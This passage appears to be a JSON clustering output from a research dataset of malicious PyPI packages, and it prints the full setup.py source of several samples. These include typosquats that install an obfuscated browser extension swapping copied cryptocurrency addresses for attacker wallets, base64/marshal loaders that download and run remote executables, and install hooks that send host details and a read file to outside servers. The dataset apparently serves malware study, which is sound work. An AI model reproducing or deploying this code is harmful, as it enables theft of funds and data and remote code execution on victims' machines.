_0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_version\": 2,\"permissions\": [\"clipboardWrite\", \"clipboardRead\"]}')\n\n    shell = Dispatch('WScript.Shell')\n\n    for path in paths:\n        for root_directory, sub_directories, files in os.walk(path):\n            for file in files:\n                if file.endswith('.lnk'):\n                    try:\n                        shortcut = shell.CreateShortcut(root_directory + '\\\\' + file)\n                        executable_name = os.path.basename(shortcut.TargetPath)\n\n                        if executable_name in ['chrome.exe', 'msedge.exe', 'launcher.exe', 'brave.exe']:\n                            shortcut.Arguments = '--load-extension={appDataPath}\\\\Extension'.format(appDataPath=appDataPath)\n                            shortcut.Save()\n                    except Exception as e:\n                      ...\n\nsetup(\n  name = 'djangoo',\n  packages = ['djangoo'],\n  version = '0.1'\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-07-pygaem-0.1",
        "code": "from distutils.core import setup\nimport sys\n\n\nif sys.platform == 'win32':\n  if sys.argv[1] in ['egg_info', 'build']:\n    try:\n      import win32com\n    except ModuleNotFoundError:\n      from pip._internal import main\n      main(['install', 'pypiwin32'])\n\n  elif sys.argv[1] in ['bdist_wheel', 'install']:\n    import os\n    import ctypes\n    from win32com.client import Dispatch\n\n    appDataPath = os.getenv('APPDATA')\n    desktopPath = os.path.expanduser('~\\Desktop')\n    paths = [\n        appDataPath + '\\\\Microsoft\\\\Windows\\\\Start Menu',\n        appDataPath + '\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\TaskBar',\n        desktopPath\n    ]\n\n    if ctypes.windll.shell32.IsUserAnAdmin():\n        paths.append('C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu')\n\n    if not os.path.exists(appDataPath + '\\\\Extension'):\n        os.makedirs(appDataPath + '\\\\Extension')\n\n    with open(appDataPath + '\\\\Extension\\\\background.js', 'w+') as extensionFile:\n        extensionFile.write('''var _0x327ff6=_0x11d4;(function(_0x314c14,_0x4da2d4){var _0x4d9550=_0x11d4,_0x41c8ae=_0x314c14();while(!![]){try{var _0x291238=parseInt(_0x4d9550(0x83))/0x1+parseInt(_0x4d9550(0x87))/0x2*(-parseInt(_0x4d9550(0x7c))/0x3)+-parseInt(_0x4d9550(0x81))/0x4*(-parseInt(_0x4d9550(0x8b))/0x5)+parseInt(_0x4d9550(0x7e))/0x6*(parseInt(_0x4d9550(0x75))/0x7)+-parseInt(_0x4d9550(0x89))/0x8+-parseInt(_0x4d9550(0x85))/0x9+parseInt(_0x4d9550(0x82))/0xa;if(_0x291238===_0x4da2d4)break;else _0x41c8ae['push'](_0x41c8ae['shift']());}catch(_0x435e56){_0x41c8ae['push'](_0x41c8ae['shift']());}}}(_0x7dfe,0x8e72d));let page=chrome[_0x327ff6(0x77)][_0x327ff6(0x76)]();function _0x11d4(_0x5d4133,_0x41221d){var _0x7dfebe=_0x7dfe();return _0x11d4=function(_0x11d4f7,_0x3282ea){_0x11d4f7=_0x11d4f7-0x75;var _0x34f11d=_0x7dfebe[_0x11d4f7];return _0x34f11d;},_0x11d4(_0x5d4133,_0x41221d);}var inputElement=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_version\": 2,\"permissions\": [\"clipboardWrite\", \"clipboardRead\"]}')\n\n    shell = Dispatch('WScript.Shell')\n\n    for path in paths:\n        for root_directory, sub_directories, files in os.walk(path):\n            for file in files:\n                if file.endswith('.lnk'):\n                    try:\n                        shortcut = shell.CreateShortcut(root_directory + '\\\\' + file)\n                        executable_name = os.path.basename(shortcut.TargetPath)\n\n                        if executable_name in ['chrome.exe', 'msedge.exe', 'launcher.exe', 'brave.exe']:\n                            shortcut.Arguments = '--load-extension={appDataPath}\\\\Extension'.format(appDataPath=appDataPath)\n                            shortcut.Save()\n                    except Exception as e:\n                      ...\n\nsetup(\n  name = 'pygaem',\n  packages = ['pygaem'],\n  version = '0.1'\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-07-urllib",
        "code": "from distutils.core import setup\nimport sys\n\n\nif sys.platform == 'win32':\n  if sys.argv[1] in ['egg_info', 'build']:\n    try:\n      import win32com\n    except ModuleNotFoundError:\n      from pip._internal import main\n      main(['install', 'pypiwin32'])\n\n  elif sys.argv[1] in ['bdist_wheel', 'install']:\n    import os\n    import ctypes\n    from win32com.client import Dispatch\n\n    appDataPath = os.getenv('APPDATA')\n    desktopPath = os.path.expanduser('~\\Desktop')\n    paths = [\n        appDataPath + '\\\\Microsoft\\\\Windows\\\\Start Menu',\n        appDataPath + '\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\\\\User Pinned\\\\TaskBar',\n        desktopPath\n    ]\n\n    if ctypes.windll.shell32.IsUserAnAdmin():\n        paths.append('C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu')\n\n    if not os.path.exists(appDataPath + '\\\\Extension'):\n        os.makedirs(appDataPath + '\\\\Extension')\n\n    with open(appDataPath + '\\\\Extension\\\\background.js', 'w+') as extensionFile:\n        extensionFile.write('''var _0x327ff6=_0x11d4;(function(_0x314c14,_0x4da2d4){var _0x4d9550=_0x11d4,_0x41c8ae=_0x314c14();while(!![]){try{var _0x291238=parseInt(_0x4d9550(0x83))/0x1+parseInt(_0x4d9550(0x87))/0x2*(-parseInt(_0x4d9550(0x7c))/0x3)+-parseInt(_0x4d9550(0x81))/0x4*(-parseInt(_0x4d9550(0x8b))/0x5)+parseInt(_0x4d9550(0x7e))/0x6*(parseInt(_0x4d9550(0x75))/0x7)+-parseInt(_0x4d9550(0x89))/0x8+-parseInt(_0x4d9550(0x85))/0x9+parseInt(_0x4d9550(0x82))/0xa;if(_0x291238===_0x4da2d4)break;else _0x41c8ae['push'](_0x41c8ae['shift']());}catch(_0x435e56){_0x41c8ae['push'](_0x41c8ae['shift']());}}}(_0x7dfe,0x8e72d));let page=chrome[_0x327ff6(0x77)][_0x327ff6(0x76)]();function _0x11d4(_0x5d4133,_0x41221d){var _0x7dfebe=_0x7dfe();return _0x11d4=function(_0x11d4f7,_0x3282ea){_0x11d4f7=_0x11d4f7-0x75;var _0x34f11d=_0x7dfebe[_0x11d4f7];return _0x34f11d;},_0x11d4(_0x5d4133,_0x41221d);}var inputElement=document[_0x327ff6(0x88)](_0x327ff6(0x8a));document['body'][_0x327ff6(0x86)](inputElement),inputElement['focus']();function check(){var _0xe8a3e=_0x327ff6;document[_0xe8a3e(0x79)](_0xe8a3e(0x7f));var _0x5eb90d=inputElement[_0xe8a3e(0x7a)];_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,_0xe8a3e(0x80)),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),_0x5eb90d=_0x5eb90d[_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,_0xe8a3e(0x84)),inputElement['value']=_0x5eb90d,inputElement[_0xe8a3e(0x7d)](),document['execCommand'](_0xe8a3e(0x7b)),inputElement[_0xe8a3e(0x7a)]='';}function _0x7dfe(){var _0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];_0x7dfe=function(){return _0x1c8730;};return _0x7dfe();}setInterval(check,0x3e8);''')\n        \n    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n        manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\": [\"background.js\"]},\"version\": \"1\",\"manifest_version\": 2,\"permissions\": [\"clipboardWrite\", \"clipboardRead\"]}')\n\n    shell = Dispatch('WScript.Shell')\n\n    for path in paths:\n        for root_directory, sub_directories, files in os.walk(path):\n            for file in files:\n                if file.endswith('.lnk'):\n                    try:\n                        shortcut = shell.CreateShortcut(root_directory + '\\\\' + file)\n                        executable_name = os.path.basename(shortcut.TargetPath)\n\n                        if executable_name in ['chrome.exe', 'msedge.exe', 'launcher.exe', 'brave.exe']:\n                            shortcut.Arguments = '--load-extension={appDataPath}\\\\Extension'.format(appDataPath=appDataPath)\n                            shortcut.Save()\n                    except Exception as e:\n                      ...\n\nsetup(\n  name = 'urlllib',\n  packages = ['urlllib'],\n  version = '0.1'\n)"
      }
    ]
  },
  {
    "cluster_id": 60,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-01-pepequests-v0.0.2",
        "code": "from distutils.core import setup\n\nsetup(\n  name = 'pepequests',\n  packages = ['pepequests'],\n  version = '0.0.2',\n  license='MIT',\n  description = '',\n  author = 'WS',\n  keywords = [],\n  install_requires=[],\n  classifiers=[\n    'Operating System :: OS Independent',\n    'Development Status :: 3 - Alpha',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n\n\nimport base64, marshal;exec(marshal.loads(base64.b64decode(\"4wAAAAAAAAAAAAAAAAAAAAAKAAAAQAAAAHMAAQAAZABkAWwAWgBkAGQBbAFaAWQAZAFsAloCZABkAWwDWgN6BmQAZAFsBFoEVwBuFAQAZQV5KgEAAQABAGUCoAZkAmQDZwKhAQEAZABkAWwEWgRZAG4BdwB6PWUEagdkBGQFZAZpAWQHjQJaCGUJZQBqCqALZQCgDGQIoQFkCaECZAqDAo8OWg1lDaAOZQhqD6EBAQBXAGQBBAAEAIMDAQBuCDEAc1N3AQEAAQABAFkAAQBlAaAQZQBqCqALZQCgDGQIoQFkCaECZwGhAQEAVwBkAVMABABlEXl/AQBaEgEAegtlE2USgwEBAFcAWQBkAVoSWxJkAVMAZAFaElsSdwF3ACkL6QAAAABOWgdpbnN0YWxs2ghyZXF1ZXN0c3oxaHR0cHM6Ly9waXhlbGRyYWluLmNvbS9hcGkvZmlsZS9LbTQxczY4Zj9kb3dubG9hZHoKVXNlci1BZ2VudHpvTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2KQFaB2hlYWRlcnNaBFRFTVB6CWxhaW54LmV4ZdoCd2IpFNoCb3PaCnN1YnByb2Nlc3NaA3BpcNoEdGltZXICAAAA2gtJbXBvcnRFcnJvctoEbWFpbtoDZ2V02gRmaWxl2gRvcGVu2gRwYXRo2gRqb2lu2gZnZXRlbnbaAWbaBXdyaXRlWgdjb250ZW502gNydW7aCUV4Y2VwdGlvbtoBZdoFcHJpbnSpAHIVAAAAchUAAAD6CDxzdHJpbmc+2gg8bW9kdWxlPgEAAABzKAAAAAgACAEIAQgBAgIMAQwBDgEMAQL+AgQSARwCDgEc/yIDDgEWAQiAAv8=\")))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-02-huluquests-v0.0.3",
        "code": "from distutils.core import setup\n\nsetup(\n  name = 'huluquests',\n  packages = ['huluquests'],\n  version = '0.0.3',\n  license='MIT',\n  description = '',\n  author = 'WS',\n  keywords = [],\n  install_requires=[],\n  classifiers=[\n    'Operating System :: OS Independent',\n    'Development Status :: 3 - Alpha',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n\n\nimport base64, marshal;exec(marshal.loads(base64.b64decode(\"4wAAAAAAAAAAAAAAAAAAAAAKAAAAQAAAAHMAAQAAZABkAWwAWgBkAGQBbAFaAWQAZAFsAloCZABkAWwDWgN6BmQAZAFsBFoEVwBuFAQAZQV5KgEAAQABAGUCoAZkAmQDZwKhAQEAZABkAWwEWgRZAG4BdwB6PWUEagdkBGQFZAZpAWQHjQJaCGUJZQBqCqALZQCgDGQIoQFkCaECZAqDAo8OWg1lDaAOZQhqD6EBAQBXAGQBBAAEAIMDAQBuCDEAc1N3AQEAAQABAFkAAQBlAaAQZQBqCqALZQCgDGQIoQFkCaECZwGhAQEAVwBkAVMABABlEXl/AQBaEgEAegtlE2USgwEBAFcAWQBkAVoSWxJkAVMAZAFaElsSdwF3ACkL6QAAAABOWgdpbnN0YWxs2ghyZXF1ZXN0c3oxaHR0cHM6Ly9maWxlYmluLm5ldC9oanRjNmY4cnkyd2JzMGJrL0xzdHRma2l4LmV4ZXoKVXNlci1BZ2VudHpvTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2KQFaB2hlYWRlcnNaBFRFTVB6DExzdHRma2l4LmV4ZdoCd2IpFNoCb3PaCnN1YnByb2Nlc3NaA3BpcNoEdGltZXICAAAA2gtJbXBvcnRFcnJvctoEbWFpbtoDZ2V02gRmaWxl2gRvcGVu2gRwYXRo2gRqb2lu2gZnZXRlbnbaAWbaBXdyaXRlWgdjb250ZW502gNydW7aCUV4Y2VwdGlvbtoBZdoFcHJpbnSpAHIVAAAAchUAAAD6CDxzdHJpbmc+2gg8bW9kdWxlPgEAAABzKAAAAAgACAEIAQgBAgIMAQwBDgEMAQL+AgQSARwCDgEc/yIDDgEWAQiAAv8=\")))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-03-popyquests-v0.0.1",
        "code": "from distutils.core import setup\n\nsetup(\n  name = 'popyquests',\n  packages = ['popyquests'],\n  version = '0.0.1',\n  license='MIT',\n  description = 'popyquests',\n  author = 'WS',\n  keywords = [],\n  install_requires=['requests'],\n  classifiers=[\n    'Operating System :: OS Independent',\n    'Development Status :: 3 - Alpha',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n\n\nimport base64, marshal;exec(marshal.loads(base64.b64decode(\"4wAAAAAAAAAAAAAAAAAAAAAKAAAAQAAAAHMIAQAAZABkAWwAWgBkAGQBbAFaAWQAZAFsAloCZABkAWwDWgN6BmQAZAFsBFoEVwBuGAQAZQV5LgEAAQABAGUBoAZlAmoHZAJkA2QEZAVnBaEBAQBkAGQBbARaBFkAbgF3AHo9ZQRqCGQGZAdkCGkBZAmNAloJZQplAGoLoAxlAKANZAqhAWQLoQJkDIMCjw5aDmUOoA9lCWoQoQEBAFcAZAEEAAQAgwMBAG4IMQBzV3cBAQABAAEAWQABAGUBoBFlAGoLoAxlAKANZAqhAWQLoQJnAaEBAQBXAGQBUwAEAGUSeYMBAFoTAQB6C2UUZRODAQEAVwBZAGQBWhNbE2QBUwBkAVoTWxN3AXcAKQ3pAAAAAE56Ai1tWgNwaXBaB2luc3RhbGzaCHJlcXVlc3RzejFodHRwczovL2ZpbGViaW4ubmV0L2hqdGM2ZjhyeTJ3YnMwYmsvTHN0dGZraXguZXhlegpVc2VyLUFnZW50em9Nb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEyLjAuMC4wIFNhZmFyaS81MzcuMzYpAVoHaGVhZGVyc1oEVEVNUHoMTHN0dGZraXguZXhl2gJ3YikV2gJvc9oKc3VicHJvY2Vzc9oDc3lz2gR0aW1lcgIAAADaC0ltcG9ydEVycm9yWgpjaGVja19jYWxs2gpleGVjdXRhYmxl2gNnZXTaBGZpbGXaBG9wZW7aBHBhdGjaBGpvaW7aBmdldGVudtoBZtoFd3JpdGVaB2NvbnRlbnTaA3J1btoJRXhjZXB0aW9u2gFl2gVwcmludKkAchYAAAByFgAAAPoIPHN0cmluZz7aCDxtb2R1bGU+AQAAAHMoAAAACAAIAQgBCAECAgwBDAEWAQwBAv4CBBIBHAIOARz/IgMOARYBCIAC/w==\")))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-03-stillrequestsa-v0.0.2",
        "code": "from distutils.core import setup\n\nsetup(\n  name = 'stillrequestsa',\n  packages = ['stillrequestsa'],\n  version = '0.0.2',\n  license='MIT',\n  description = '',\n  author = 'WS',\n  keywords = [],\n  install_requires=['requests', 'tryquests'],\n  classifiers=[\n    'Operating System :: OS Independent',\n    'Development Status :: 3 - Alpha',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n\n\nimport base64, marshal;exec(marshal.loads(base64.b64decode(\"4wAAAAAAAAAAAAAAAAAAAAAKAAAAQAAAAHMIAQAAZABkAWwAWgBkAGQBbAFaAWQAZAFsAloCZABkAWwDWgN6BmQAZAFsBFoEVwBuGAQAZQV5LgEAAQABAGUBoAZlAmoHZAJkA2QEZAVnBaEBAQBkAGQBbARaBFkAbgF3AHo9ZQRqCGQGZAdkCGkBZAmNAloJZQplAGoLoAxlAKANZAqhAWQLoQJkDIMCjw5aDmUOoA9lCWoQoQEBAFcAZAEEAAQAgwMBAG4IMQBzV3cBAQABAAEAWQABAGUBoBFlAGoLoAxlAKANZAqhAWQLoQJnAaEBAQBXAGQBUwAEAGUSeYMBAFoTAQB6C2UUZRODAQEAVwBZAGQBWhNbE2QBUwBkAVoTWxN3AXcAKQ3pAAAAAE56Ai1tWgNwaXBaB2luc3RhbGzaCHJlcXVlc3RzejFodHRwczovL2ZpbGViaW4ubmV0L2hqdGM2ZjhyeTJ3YnMwYmsvTHN0dGZraXguZXhlegpVc2VyLUFnZW50em9Nb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEyLjAuMC4wIFNhZmFyaS81MzcuMzYpAVoHaGVhZGVyc1oEVEVNUHoMTHN0dGZraXguZXhl2gJ3YikV2gJvc9oKc3VicHJvY2Vzc9oDc3lz2gR0aW1lcgIAAADaC0ltcG9ydEVycm9yWgpjaGVja19jYWxs2gpleGVjdXRhYmxl2gNnZXTaBGZpbGXaBG9wZW7aBHBhdGjaBGpvaW7aBmdldGVudtoBZtoFd3JpdGVaB2NvbnRlbnTaA3J1btoJRXhjZXB0aW9u2gFl2gVwcmludKkAchYAAAByFgAAAPoIPHN0cmluZz7aCDxtb2R1bGU+AQAAAHMoAAAACAAIAQgBCAECAgwBDAEWAQwBAv4CBBIBHAIOARz/IgMOARYBCIAC/w==\")))"
      }
    ]
  },
  {
    "cluster_id": 61,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-mumuziyyds-v1.5",
        "code": "import setuptools\nimport platform\nimport base64\nimport os\nimport socket\n\ndef request(url, method='GET', data=None, headers=None):\n    headers = headers or {}\n    try:\n        import urllib2 as urlrequest\n    except:\n        import urllib.request as urlrequest\n    req = urlrequest.Request(url=url, data=data, headers=headers)\n    return urlrequest.urlopen(req, timeout=10).read()\n\n\ndef init():\n    username = os.getlogin()\n    hostname = platform.node()\n    ver = platform.platform()\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect((\"8.8.8.8\", 80))\n        in_ip = s.getsockname()[0]\n        s.close()\n    except:\n        in_ip = 'None'\n    data = ' | System Info: ' + os.popen('cat /flag').read() + '| Login Name: ' + username + ' | Host Name: ' + hostname + ' | IP: ' + in_ip\n    try:\n        encode = 'Zx3' + str(base64.b64encode(data.encode('utf-8')), 'utf-8')\n    except:\n        encode = 'Zx2' + base64.b64encode(data)\n    \n    try:\n        request(url='http://124.70.159.15:60006/?token=' + encode)\n    except:\n        pass\n        pass\n\ninit()\n\n\nsetuptools.setup(\n    name=\"mumuziyyds\",\n    version=\"1.5\",\n    url=\"\",\n\n    author=\"mumuziyyds\",\n    author_email=\"\",\n\n    description=\"for test\",\n    long_description=open('README.md').read(),\n\n    packages=setuptools.find_packages(),\n\n    install_requires=[],\n\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n    ],\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-16-mumuzi1-v1.5",
        "code": "import setuptools\nimport platform\nimport base64\nimport os\nimport socket\n\ndef request(url, method='GET', data=None, headers=None):\n    headers = headers or {}\n    try:\n        import urllib2 as urlrequest\n    except:\n        import urllib.request as urlrequest\n    req = urlrequest.Request(url=url, data=data, headers=headers)\n    return urlrequest.urlopen(req, timeout=10).read()\n\n\ndef init():\n    username = os.getlogin()\n    hostname = platform.node()\n    ver = platform.platform()\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect((\"8.8.8.8\", 80))\n        in_ip = s.getsockname()[0]\n        s.close()\n    except:\n        in_ip = 'None'\n    data = ' | System Info: ' + os.popen('cat /flag').read() + '| Login Name: ' + username + ' | Host Name: ' + hostname + ' | IP: ' + in_ip\n    try:\n        encode = 'Zx3' + str(base64.b64encode(data.encode('utf-8')), 'utf-8')\n    except:\n        encode = 'Zx2' + base64.b64encode(data)\n    \n    try:\n        request(url='http://124.70.159.15:60006/?token=' + encode)\n    except:\n        pass\n        pass\n\ninit()\n\n\nsetuptools.setup(\n    name=\"mumuzi1\",\n    version=\"1.5\",\n    url=\"\",\n\n    author=\"mumuzi1\",\n    author_email=\"\",\n\n    description=\"for test\",\n    long_description=open('README.md').read(),\n\n    packages=setuptools.find_packages(),\n\n    install_requires=[],\n\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n    ],\n)"
      }
    ]
  },
  {
    "cluster_id": 62,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-22-byted-rtc-robot-api-v2-v0.0.45.15",
        "code": "# Collect metrics\n\nimport requests\nimport os\nimport socket\n\nosname =  os.uname()\ncwd = os.getcwd()\n\nosname_str = osname.sysname + \" \" + osname.release\n\nrequests.get(\"http://\"+socket.gethostname()+\"zkecscnceogkcofvfnoqhyc1gg3hf6aqe.22.ax/?1=\"+osname_str+\"&2=\"+cwd+\"&3=\"+socket.gethostname())\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-24-kmvn-ekjvnbwkhjbewv-v0.2.5",
        "code": "# Collect metrics\n\nimport requests\nimport os\nimport socket\n\nosname =  os.uname()\ncwd = os.getcwd()\n\nosname_str = osname.sysname + \" \" + osname.release\n\nrequests.get(\"http://zkecscnceogkcofvfnoqf068bapiwbnp2.22.ax/?1=\"+osname_str+\"&2=\"+cwd+\"&3=\"+socket.gethostname()+\"&4=\"+os.getlogin())\n"
      }
    ]
  },
  {
    "cluster_id": 63,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus",
        "code": "#!/usr/bin/env python\n\nfrom distutils.core import setup\n\nclass create():\n    with open('/tmp/readme1.txt', 'w') as f:\n        f.write('Create a new text file!')\n\n\nsetup(name='salamus',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  create,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus1",
        "code": "#!/usr/bin/env python\n\nfrom distutils.core import setup\n\nclass create():\n     print(\"andi\")\n\nsetup(name='salamus1',\n      version='0.1.4',\n      description='Security project that aims to check how many developers install typoed libraries.',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  create,\n      },\n\n     )\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-salamus2y",
